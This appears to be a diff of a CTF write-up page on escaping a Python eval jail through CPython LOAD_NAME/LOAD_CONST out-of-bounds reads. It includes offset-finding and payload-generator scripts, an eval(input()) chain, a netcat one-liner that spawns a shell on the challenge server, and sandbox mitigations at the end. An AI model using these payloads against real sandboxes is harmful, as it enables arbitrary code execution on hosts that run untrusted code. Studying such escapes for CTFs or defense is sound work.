@@ -1,7 +1,6 @@
 # LOAD_NAME / LOAD_CONST opcode OOB Read
 
-
-**This info was taken** [[https://blog.splitline.tw/hitcon-ctf-2022/|**from this writeup**]]**.**
+**This info was taken** [**from this writeup**](https://blog.splitline.tw/hitcon-ctf-2022/)**.**
 
 ### TL;DR 
 
@@ -19,8 +18,8 @@ if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
 code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
 print(eval(code, {'__builtins__': {}}))1234
 ```
-```
-You can input arbitrary Python code, and it'll be compiled to a [[https://docs.python.org/3/c-api/code.html|Python code object]]. However `co_consts` and `co_names` of that code object will be replaced with an empty tuple before eval that code object.
+
+You can input arbitrary Python code, and it'll be compiled to a [Python code object](https://docs.python.org/3/c-api/code.html). However `co_consts` and `co_names` of that code object will be replaced with an empty tuple before eval that code object.
 
 So in this way, all the expression contains consts (e.g. numbers, strings etc.) or names (e.g. variables, functions) might cause segmentation fault in the end.
 
@@ -37,7 +36,7 @@ Let's start with a simple example, `[a, b, c]` could compile into the following 
               6 BUILD_LIST               3
               8 RETURN_VALUE12345
 ```
-```
+
 But what if the `co_names` become empty tuple? The `LOAD_NAME 2` opcode is still executed, and try to read value from that memory address it originally should be. Yes, this is an out-of-bound read "feature".
 
 The core concept for the solution is simple. Some opcodes in CPython for example `LOAD_NAME` and `LOAD_CONST` are vulnerable (?) to OOB read.
@@ -53,7 +52,7 @@ case TARGET(LOAD_CONST): {
     FAST_DISPATCH();
 }1234567
 ```
-```
+
 In this way we can use the OOB feature to get a "name" from arbitrary memory offset. To make sure what name it has and what's it's offset, just keep trying `LOAD_NAME 0`, `LOAD_NAME 1` ... `LOAD_NAME 99` ... And you could find something in about oparg > 700. You can also try to use gdb to take a look at the memory layout of course, but I don't think it would be more easier?
 
 ### Generating the Exploit 
@@ -67,7 +66,7 @@ Let's assume we can get a `__getattribute__` name from offset 5 (`LOAD_NAME 5`) 
     # you can get the __getattribute__ method of list object now!
 ]1234
 ```
-```
+
 > Notice that it is not necessary to name it as `__getattribute__`, you can name it as something shorter or more weird
 
 You can understand the reason behind by just viewing it's bytecode:
@@ -88,7 +87,7 @@ You can understand the reason behind by just viewing it's bytecode:
              24 BUILD_LIST               1
              26 RETURN_VALUE1234567891011121314
 ```
-```
+
 Notice that `LOAD_ATTR` also retrieve the name from `co_names`. Python loads names from the same offset if the name is the same, so the second `__getattribute__` is still loaded from offset=5. Using this feature we can use arbitrary name once the name is in the memory nearby.
 
 For generating numbers should be trivial:
@@ -109,10 +108,12 @@ from types import CodeType
 from opcode import opmap
 from sys import argv
 
+
 class MockBuiltins(dict):
     def __getitem__(self, k):
         if type(k) == str:
             return k
+
 
 if __name__ == '__main__':
     n = int(argv[1])
@@ -136,12 +137,13 @@ if __name__ == '__main__':
 
 # for i in $(seq 0 10000); do python find.py $i ; done1234567891011121314151617181920212223242526272829303132
 ```
-```
+
 And the following is for generating the real Python exploit.
 
 ```python
 import sys
 import unicodedata
+
 
 class Generator:
     # get numner
@@ -158,6 +160,7 @@ class Generator:
         except ValueError:
             offset = None.__class__.__dir__(None.__class__).index(name)
             return f'keys2[{self(offset)}]'
+
 
 _ = Generator()
 
@@ -188,6 +191,7 @@ for i, var in enumerate(variables):
     assert var not in offsets
     names[792 + i] = var
 
+
 source = f'''[
 ({",".join(names)}) if [] else [],
 None_ := [[]].__delitem__({_(0)}),
@@ -212,7 +216,7 @@ print(source)
 # (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
 ```
-```
+
 It basically does the following things, for those strings we get it from the `__dir__` method:
 
 ```python
@@ -225,9 +229,9 @@ builtins = getattr(
   '__subclasses__'
   )()[-2],
 '__repr__').__getattribute__('__globals__')['builtins']
-builtins[[builtins['input']()|'eval']]
+builtins['eval'](builtins['input']())
 ```
-```
+
 ---
 
 ### Version notes and affected opcodes (Python 3.11–3.13)
@@ -281,7 +285,7 @@ for idx in range(0, 300):
     if obj is not None:
         print(idx, type(obj), repr(obj)[:80])
 ```
-```
+
 Notes
 - To probe names instead, swap `LOAD_CONST` for `LOAD_NAME`/`LOAD_GLOBAL`/`LOAD_ATTR` and adjust your stack usage accordingly.
 - Use `EXTENDED_ARG` or multiple bytes of `arg` to reach indexes >255 if needed. When building with `dis` as above, you only control the low byte; for larger indexes, construct the raw bytes yourself or split the attack across multiple loads.
@@ -298,7 +302,7 @@ Once you have identified a `co_consts` index that resolves to the builtins modul
 # 3) BINARY_SUBSCR to do builtins["input"] / builtins["eval"], CALL each, and RETURN_VALUE
 # This pattern is the same idea as the high-level exploit above, but expressed in raw bytecode.
 ```
-```
+
 This approach is useful in challenges that give you direct control over `co_code` while forcing `co_consts=()` and `co_names=()` (e.g., BCTF 2024 “awpcode”). It avoids source-level tricks and keeps payload size small by leveraging bytecode stack ops and tuple builders.
 
 ### Defensive checks and mitigations for sandboxes
@@ -338,11 +342,10 @@ def validate_code_object(code: type((lambda:0).__code__)):
 # validate_code_object(c)
 # eval(c, {'__builtins__': {}})
 ```
-```
+
 Additional mitigation ideas
 - Don’t allow arbitrary `CodeType.replace(...)` on untrusted input, or add strict structural checks on the resulting code object.
 - Consider running untrusted code in a separate process with OS-level sandboxing (seccomp, job objects, containers) instead of relying on CPython semantics.
-
 
 ## References
 
